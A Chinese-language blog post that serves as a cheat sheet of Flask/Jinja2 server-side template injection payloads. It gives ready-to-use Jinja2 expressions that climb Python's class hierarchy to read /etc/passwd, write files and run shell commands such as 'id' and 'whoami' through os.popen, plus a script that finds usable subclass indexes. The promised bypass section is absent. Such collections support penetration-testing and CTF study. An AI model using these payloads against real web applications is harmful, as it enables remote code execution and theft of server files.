---
layout:     post
title:      Flask ssti
subtitle:   总结一下ssti常见payload 和 绕过方式
date:       2020-05-20
author:     BY Diego
header-img: img/wenzhang/post-bg-flask-ssti.jpg
catalog: true
tags:
    - Python
    - 命令注入
---

# 一、 常见payload

```
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
__getattribute__ 使用实例访问属性时,调用该方法
__dict__ 查看方法
```

获取object

```python
''.__class__.__mro__[2]  #python2
''.__class__.__mro__[1] #python3
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] #针对jinjia2/flask为[9]适用 [10]
```

类似request的还可以利用 url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config

通过self.\_\_dict__ 查看


**获取索引**
```python
''.__class__.__mro__[2].__subclasses__().index(file)
```

**读文件**
python2
```python
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```
python3
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

**写文件**
```python
().__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('test').write("test")
```

**执行命令**
python3
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
```
python2 (针对catch_warnings模块，python3也可只要知道模块对应位置)
```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen("whoami").read()
```
还有下面方法，直接贴别人图了，（懒）
[![Y5LJMj.png](https://s1.ax1x.com/2020/05/19/Y5LJMj.png)](https://imgchr.com/i/Y5LJMj)

**使用脚本寻找(因环境而异)**
```python
_list =[].__class__.__base__.__subclasses__()
for c in _list:
	try:
		if "open" in c.__init__.__globals__['__builtins__']:
			print(c.__name__,_list.index(c))
	except Exception as e:
		pass
```
读文件
```python
{{[].__class__.__base__.__subclasses__()[对应数].__init__.__globals__['__builtins__'].open("/etc/passwd").read()}}
```
[![Y5LYss.png](https://s1.ax1x.com/2020/05/19/Y5LYss.png)](https://imgchr.com/i/Y5LYss)

命令执行找eval 或者\_\_import__,除去引用os模块还可以用其他可执行命令的模块 commands 等
```python
{{[].__class__.__base__.__subclasses__()[对应数字].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}

{{[].__class__.__base__.__subclasses__()[对应数字].__init__.__globals__['__builtins__'].__import__('os').popen('whoami').read()}}
```




# 三、参考

[SSTI: Bypass in a hard place, Fort Knox — ASIS Quals 2019](https://medium.com/@elberandre/ssti-bypass-in-a-hard-place-fort-knox-asis-quals-2019-91bc35a349d3)

[SSTI Bypass 分析](https://www.secpulse.com/archives/115367.html)

[Flask/Jinja2模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)

[浅析SSTI(python沙盒绕过)](http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/)
